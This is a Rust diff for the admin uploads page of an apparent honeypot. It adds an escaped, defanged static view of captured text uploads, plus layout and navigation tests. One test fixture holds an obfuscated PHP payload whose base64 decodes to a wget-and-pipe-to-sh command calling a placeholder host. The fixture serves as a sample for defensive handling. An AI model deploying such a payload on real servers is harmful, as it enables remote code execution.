@@ -1,12 +1,14 @@
 //! Admin › Uploads: the files dropped on the trap (MIK-121), their
 //! metadata, and the requests later made where each was told it landed.
-//! Content is hostile: it is never shown, inlined or unpacked here. It
+//! Content is hostile. A text upload is parsed statically and shown
+//! escaped; a binary is never parsed, shown, inlined or unpacked here. It
 //! leaves only as a download, in a zip encrypted with the password
 //! `infected` (a handling convention, not a protection: ZipCrypto is weak).
 use crate::admin::AdminState;
 use crate::admin::auth::SessionUser;
 use crate::admin::error::{AppError, AppResult, render};
 use crate::admin::views::Chrome;
+use crate::model::xray::{Policy, Source, parse};
 use crate::store::browse::{Page, lenient_i64, page_num};
 use crate::store::uploads::{self, TimelineRow, UploadRow};
 use askama::Template;
@@ -103,6 +105,9 @@ struct UploadPage {
     u: UploadRow,
     timeline: Vec<TimelineRow>,
     timeline_max: i64,
+    /// A text upload opened layer by layer; binaries have none.
+    xray: Option<crate::admin::xray::XrayView>,
+    strips: crate::admin::chains::Strips,
 }
 
 async fn detail(
@@ -115,8 +120,35 @@ async fn detail(
         return Err(AppError::NotFound);
     };
     let timeline = uploads::timeline(&mut conn, &u).await?;
+    let text = uploads::text_for_xray(&mut conn, &u).await?;
+    drop(conn);
+    let (name, size, ip) = (u.filename.clone(), u.size as usize, u.ip.clone());
+    let read = tokio::task::spawn_blocking(move || {
+        text.map(|text| {
+            crate::admin::xray::xray_view(&parse(
+                Source::Upload {
+                    name: name.as_deref(),
+                    text: &text,
+                    size,
+                    sender: Some(&ip),
+                },
+                Policy::embedded(),
+            ))
+        })
+    });
+    let xray = read.await.map_err(anyhow::Error::from)?;
+    let ip_id = st.store.ip_by_addr(&u.ip).await?.map_or(0, |i| i.id);
+    let strips = crate::admin::chains::of_source(
+        &st,
+        crate::store::chains::Anchor::Upload(&uid),
+        ip_id,
+        &u.ip,
+    )
+    .await?;
     render(&UploadPage {
         chrome: Chrome::new(true, "admin"),
+        strips,
+        xray,
         u,
         timeline,
         timeline_max: uploads::TIMELINE_MAX,
@@ -194,6 +226,18 @@ pub(crate) mod tests {
         content: &[u8],
         held: bool,
     ) -> UploadRec {
+        typed_upload(st, uid, filename, content, held, "php").await
+    }
+
+    /// [`upload`] with the type its first bytes sniffed as.
+    pub(crate) async fn typed_upload(
+        st: &crate::admin::AdminState,
+        uid: &str,
+        filename: &str,
+        content: &[u8],
+        held: bool,
+        sniffed: &str,
+    ) -> UploadRec {
         let r = UploadRec {
             uid: uid.into(),
             request_uid: format!("r-{uid}"),
@@ -201,7 +245,7 @@ pub(crate) mod tests {
             ip: "203.0.113.30".into(),
             kind: "script".into(),
             filename: Some(filename.into()),
-            sniffed_type: "php".into(),
+            sniffed_type: sniffed.into(),
             size: content.len() as i64,
             sha256: sha2::Sha256::digest(content).to_vec(),
             answered_path: format!("/uploads/{uid}.php"),
@@ -227,6 +271,317 @@ pub(crate) mod tests {
         .await
         .unwrap();
         r
+    }
+
+    /// The detail pages share one frame (`_detail_head.html`): a crumb back
+    /// to the owning list, directly above the title.
+    #[test]
+    fn every_detail_template_includes_the_shared_header() {
+        for (name, src) in [
+            ("request", include_str!("../../templates/request.html")),
+            ("ip", include_str!("../../templates/ip.html")),
+            ("upload", include_str!("../../templates/admin_upload.html")),
+            ("campaign", include_str!("../../templates/campaign.html")),
+            ("link", include_str!("../../templates/admin_link.html")),
+            ("scan", include_str!("../../templates/admin_scan.html")),
+            (
+                "canary decoy",
+                include_str!("../../templates/admin_canary_decoy.html"),
+            ),
+            (
+                "member",
+                include_str!("../../templates/admin_cluster_node.html"),
+            ),
+            ("asn", include_str!("../../templates/asn.html")),
+            ("net", include_str!("../../templates/net.html")),
+        ] {
+            assert_eq!(
+                src.matches("{% include \"_detail_head.html\" %}").count(),
+                1,
+                "{name}"
+            );
+            assert!(
+                !src.contains("← All campaigns")
+                    && !src.contains("<a href=\"/admin/traps/uploads\">← Uploads"),
+                "{name}: no hand-written back link"
+            );
+        }
+    }
+
+    /// Position of `needle` in `html`, or a panic naming it.
+    fn at(html: &str, needle: &str) -> usize {
+        html.find(needle)
+            .unwrap_or_else(|| panic!("missing {needle}"))
+    }
+
+    async fn request_html(labels: &str, ja4: Option<&str>) -> String {
+        let (st, cookie, app, _d) = app().await;
+        let ip = st
+            .store
+            .upsert_ip("192.0.2.1".parse().unwrap())
+            .await
+            .unwrap();
+        let id = st
+            .store
+            .insert_request(&crate::store::requests::NewRequest {
+                ip_id: ip.id,
+                method: "GET".into(),
+                path: "/x".into(),
+                headers_json: r#"[["Host","example.org"],["Accept","*/*"]]"#.into(),
+                labels_json: labels.into(),
+                ja4: ja4.map(Into::into),
+                ..Default::default()
+            })
+            .await
+            .unwrap();
+        let (status, _, html) = send(
+            &app,
+            Request::get(format!("/admin/requests/{id}")).header("cookie", &cookie),
+            Body::empty(),
+        )
+        .await;
+        assert_eq!(status, StatusCode::OK);
+        html
+    }
+
+    /// The request page opens with the evidence: strip, X-ray, facts, then
+    /// headers and related requests.
+    #[tokio::test]
+    async fn request_page_order_is_strip_xray_facts() {
+        let html = request_html("[]", None).await;
+        let xray = at(&html, "id=\"xray\"");
+        let facts = at(&html, "class=\"req-facts\"");
+        let headers = at(&html, "id=\"headers\"");
+        let related = at(&html, "Same IP");
+        assert!(xray < facts && facts < headers && headers < related);
+    }
+
+    /// Headers sit in a closed `<details>` that a `#headers` link can open.
+    #[tokio::test]
+    async fn headers_are_collapsed() {
+        let html = request_html("[]", None).await;
+        let d = at(&html, "<details class=\"card headers\" id=\"headers\">");
+        assert!(!html[d..d + 60].contains(" open"));
+        let sum = &html[d..d + html[d..].find("</summary>").unwrap()];
+        assert!(
+            sum.contains("<summary>") && sum.contains("2 headers"),
+            "{sum}"
+        );
+        assert!(sum.contains("Host"), "first names in the summary");
+        assert!(html[d..].contains("<dd>example.org</dd>"));
+        let js = include_str!("../../assets/js/app.js");
+        assert!(js.contains("details[id]"), "a fragment link opens it");
+    }
+
+    /// Labels are chips in the header; unset facts have no row.
+    #[tokio::test]
+    async fn labels_are_header_chips_and_empty_facts_are_hidden() {
+        let html = request_html(r#"["sqli"]"#, None).await;
+        assert!(!html.contains("<h2>Labels</h2>"));
+        let chip = at(&html, "badge-label");
+        assert!(chip > at(&html, "<h1") && chip < at(&html, "class=\"req-facts\""));
+        assert!(!html.contains("not recorded") && !html.contains("<dt>Transport</dt>"));
+        assert!(!html.contains("Its link graph") && !html.contains("<dt>Unrecorded"));
+        assert!(html.contains("<dt>Severity</dt>") && html.contains("<dt>Answered</dt>"));
+        let with = request_html("[]", Some("t13d1516h2_aaaaaaaaaaaa_bbbbbbbbbbbb")).await;
+        assert!(with.contains("t13d1516h2_aaaaaaaaaaaa_bbbbbbbbbbbb"));
+        assert!(!with.contains("badge-label"), "no labels, no chips");
+    }
+
+    /// The upload page: strip, X-ray, facts, timeline.
+    #[tokio::test]
+    async fn upload_page_order_is_strip_xray_facts() {
+        let (st, cookie, app, _d) = app().await;
+        super::tests::upload(&st, "u1", "a.php", b"<?php echo 1;", true).await;
+        let (status, _, html) = send(
+            &app,
+            Request::get("/admin/traps/uploads/u1").header("cookie", &cookie),
+            Body::empty(),
+        )
+        .await;
+        assert_eq!(status, StatusCode::OK);
+        let x = at(&html, "id=\"xray\"");
+        let f = at(&html, "class=\"facts\"");
+        let t = at(&html, "<h2>Timeline</h2>");
+        assert!(x < f && f < t);
+    }
+
+    /// Fragment targets keep landing: each id is still on the page.
+    #[tokio::test]
+    async fn fragment_links_still_land() {
+        let html = request_html("[]", None).await;
+        assert!(html.contains("id=\"headers\""));
+        let t = include_str!("../../templates/request.html");
+        for id in ["id=\"drops\"", "id=\"canaries\""] {
+            assert!(t.contains(id), "{id}");
+        }
+        assert!(include_str!("../../templates/_target.html").contains("id=\"scans\""));
+    }
+
+    /// Each rendered detail page has the crumb to its list and its h1 after it.
+    #[tokio::test]
+    async fn every_detail_page_has_the_shared_header() {
+        let (st, cookie, app, _d) = app().await;
+        upload(&st, "u1", "a.php", b"<?php", true).await;
+        crate::store::campaigns::tests::feed(&st.store, crate::store::campaigns::tests::fixture())
+            .await;
+        st.store.recompute_campaigns(true).await.unwrap();
+        let ip = st
+            .store
+            .upsert_ip("192.0.2.1".parse().unwrap())
+            .await
+            .unwrap();
+        let id = st
+            .store
+            .insert_request(&crate::store::requests::NewRequest {
+                ip_id: ip.id,
+                method: "GET".into(),
+                path: "/x".into(),
+                headers_json: "[]".into(),
+                labels_json: "[]".into(),
+                ..Default::default()
+            })
+            .await
+            .unwrap();
+        let req_page = format!("/admin/requests/{id}");
+        for (path, crumb) in [
+            (req_page.as_str(), "href=\"/requests\">← Requests</a>"),
+            ("/ip/192.0.2.1", "href=\"/ips\">← IPs</a>"),
+            (
+                "/admin/traps/uploads/u1",
+                "href=\"/admin/traps/uploads\">← Uploads</a>",
+            ),
+            (
+                "/admin/evidence/campaigns/192.0.2.3",
+                "href=\"/admin/evidence/campaigns\">← Campaigns</a>",
+            ),
+            (
+                "/admin/evidence/links/stager/example.org%3A8080",
+                "href=\"/admin/evidence/links\">← Links</a>",
+            ),
+            ("/admin/asn/64500", "href=\"/ips\">← IPs</a>"),
+        ] {
+            let (status, _, html) = send(
+                &app,
+                Request::get(path).header("cookie", &cookie),
+                Body::empty(),
+            )
+            .await;
+            assert_eq!(status, StatusCode::OK, "{path}");
+            assert_eq!(html.matches("class=\"crumb\"").count(), 1, "{path}");
+            let c = html
+                .find(crumb)
+                .unwrap_or_else(|| panic!("{path}: {crumb}"));
+            let h = html.find("<h1").unwrap();
+            assert!(c < h, "{path}: the crumb sits above the title");
+        }
+    }
+
+    /// The scan, canary-decoy and network pages carry the frame too.
+    #[tokio::test]
+    async fn scan_decoy_and_net_pages_have_the_shared_header() {
+        let (st, cookie, app, _d) = app().await;
+        crate::store::asn::tests::seed(&st.store).await;
+        let ip = st
+            .store
+            .upsert_ip("203.0.113.9".parse().unwrap())
+            .await
+            .unwrap();
+        sqlx::query(
+            "INSERT INTO scan_jobs (uid, origin, arbiter, hlc, ip_id, level, status, queued_at, scanner)
+             VALUES ('j-1', x'01', x'01', 1, ?1, 2, 'done', datetime('now'), x'02')",
+        )
+        .bind(ip.id)
+        .execute(&st.store.pool)
+        .await
+        .unwrap();
+        sqlx::query(
+            "INSERT INTO scans (job_id, ip_id, level, started_at, finished_at, uid, origin, job_uid)
+             VALUES ((SELECT id FROM scan_jobs WHERE uid = 'j-1'), ?1, 2, datetime('now'),
+                     datetime('now'), 's-1', x'02', 'j-1')",
+        )
+        .bind(ip.id)
+        .execute(&st.store.pool)
+        .await
+        .unwrap();
+        let scan: i64 = sqlx::query_scalar("SELECT id FROM scans WHERE uid = 's-1'")
+            .fetch_one(&st.store.pool)
+            .await
+            .unwrap();
+        let req = st
+            .store
+            .insert_request(&crate::store::requests::NewRequest {
+                ip_id: ip.id,
+                method: "GET".into(),
+                path: "/.env".into(),
+                headers_json: "[]".into(),
+                labels_json: "[]".into(),
+                page_token: Some("tok".into()),
+                answer: Some("decoy:dotenv".into()),
+                decoy_v: Some(1),
+                ..Default::default()
+            })
+            .await
+            .unwrap();
+        let scan_page = format!("/admin/investigate/scans/{scan}");
+        let decoy_page = format!("/admin/evidence/canaries/served/{req}");
+        for (path, crumb, nav) in [
+            (
+                scan_page.as_str(),
+                "href=\"/admin/investigate/scans\">← Scans</a>",
+                true,
+            ),
+            (
+                decoy_page.as_str(),
+                "href=\"/admin/evidence/canaries\">← Canaries</a>",
+                true,
+            ),
+            ("/admin/net/NET-1", "href=\"/ips\">← IPs</a>", false),
+        ] {
+            let (status, _, html) = send(
+                &app,
+                Request::get(path).header("cookie", &cookie),
+                Body::empty(),
+            )
+            .await;
+            assert_eq!(status, StatusCode::OK, "{path}");
+            assert_eq!(html.matches("class=\"crumb\"").count(), 1, "{path}");
+            assert!(
+                html.find(crumb).unwrap() < html.find("<h1").unwrap(),
+                "{path}"
+            );
+            assert_eq!(html.contains("Admin sections"), nav, "{path}");
+        }
+    }
+
+    /// Every admin detail page with a list in the admin tree keeps the admin
+    /// nav; the request and IP pages, which are shared with the top bar's own
+    /// lists, do not get it.
+    #[tokio::test]
+    async fn admin_nav_rule_is_the_same_on_every_detail_page() {
+        let (st, cookie, app, _d) = app().await;
+        upload(&st, "u1", "a.php", b"<?php", true).await;
+        crate::store::campaigns::tests::feed(&st.store, crate::store::campaigns::tests::fixture())
+            .await;
+        st.store.recompute_campaigns(true).await.unwrap();
+        for (path, nav) in [
+            ("/admin/traps/uploads/u1", true),
+            ("/admin/evidence/campaigns/192.0.2.3", true),
+            ("/admin/evidence/links/stager/example.org%3A8080", true),
+            ("/ip/192.0.2.1", false),
+        ] {
+            let (_, _, html) = send(
+                &app,
+                Request::get(path).header("cookie", &cookie),
+                Body::empty(),
+            )
+            .await;
+            assert_eq!(
+                html.contains("aria-label=\"Admin sections\""),
+                nav,
+                "{path}"
+            );
+        }
     }
 
     #[tokio::test]
@@ -284,8 +639,9 @@ pub(crate) mod tests {
         assert_eq!(status, StatusCode::NOT_FOUND);
     }
 
-    /// The hash is a pivot (MIK-498): it links to the list filtered to
-    /// that content, which lists only it; a value that is no sha256 is a 400.
+    /// The hash is a pivot (MIK-498): it links to the File page. The list
+    /// filtered to that content lists only it, and a value that is no sha256
+    /// is a 400.
     #[tokio::test]
     async fn the_hash_pivots_to_the_uploads_of_that_content() {
         let (st, cookie, app, _d) = app().await;
@@ -297,7 +653,7 @@ pub(crate) mod tests {
                 .header("cookie", cookie.clone())
                 .header("sec-fetch-site", "same-origin")
         };
-        let href = format!("href=\"/admin/traps/uploads?sha256={hash}\"");
+        let href = format!("href=\"/admin/evidence/links/file/{hash}\"");
         let (status, _, body) =
             send(&app, get("/admin/traps/uploads/ua".into()), Body::empty()).await;
         assert_eq!(status, StatusCode::OK);
@@ -366,5 +722,57 @@ pub(crate) mod tests {
         let mut got = vec![];
         std::io::Read::read_to_end(&mut f, &mut got).unwrap();
         assert_eq!(sha2::Sha256::digest(&got).to_vec(), r.sha256);
+    }
+
+    #[tokio::test]
+    async fn text_upload_shows_xray() {
+        let (st, cookie, app, _d) = app().await;
+        let code = "<?php eval(base64_decode('d2dldCBodHRwOi8vMTkyLjAuMi45L3guc2ggLU8tIHwgc2g=')); ?><b>x</b>";
+        upload(&st, "t1", "a.php", code.as_bytes(), true).await;
+        let req = Request::get("/admin/traps/uploads/t1")
+            .header("cookie", cookie)
+            .header("sec-fetch-site", "same-origin");
+        let (status, _, body) = send(&app, req, Body::empty()).await;
+        assert_eq!(status, StatusCode::OK);
+        assert!(body.contains("id=\"xray\""), "{body}");
+        assert!(
+            body.contains("&#60;?php") && body.contains("eval(base64_decode("),
+            "{body}"
+        );
+        assert!(!body.contains("<b>x</b>"));
+        assert!(body.contains("hxxp://192[.]0[.]2[.]9"), "{body}");
+        assert!(!body.contains("href=\"http://192"), "{body}");
+        assert!(body.contains("/admin/traps/uploads/t1/content.zip"));
+    }
+
+    #[tokio::test]
+    async fn binary_upload_shows_no_xray() {
+        let (st, cookie, app, _d) = app().await;
+        let elf = b"\x7fELF\x02\x01\x01 MARKELF";
+        typed_upload(&st, "b1", "a.bin", elf, true, "elf").await;
+        // Text bytes under a binary type are no text either.
+        typed_upload(&st, "b2", "b.bin", b"<?php echo 'MARKTXT';", true, "zip").await;
+        // Text by type, but a control byte keeps it out.
+        typed_upload(
+            &st,
+            "b3",
+            "c.txt",
+            b"hello MARKCTL \x01 world",
+            true,
+            "text",
+        )
+        .await;
+        for uid in ["b1", "b2", "b3"] {
+            let req = Request::get(format!("/admin/traps/uploads/{uid}"))
+                .header("cookie", cookie.clone())
+                .header("sec-fetch-site", "same-origin");
+            let (status, _, body) = send(&app, req, Body::empty()).await;
+            assert_eq!(status, StatusCode::OK);
+            assert!(body.contains(&format!("/admin/traps/uploads/{uid}/content.zip")));
+            assert!(!body.contains("id=\"xray\""), "{body}");
+            assert!(
+                !body.contains("MARKELF") && !body.contains("MARKTXT") && !body.contains("MARKCTL")
+            );
+        }
     }
 }
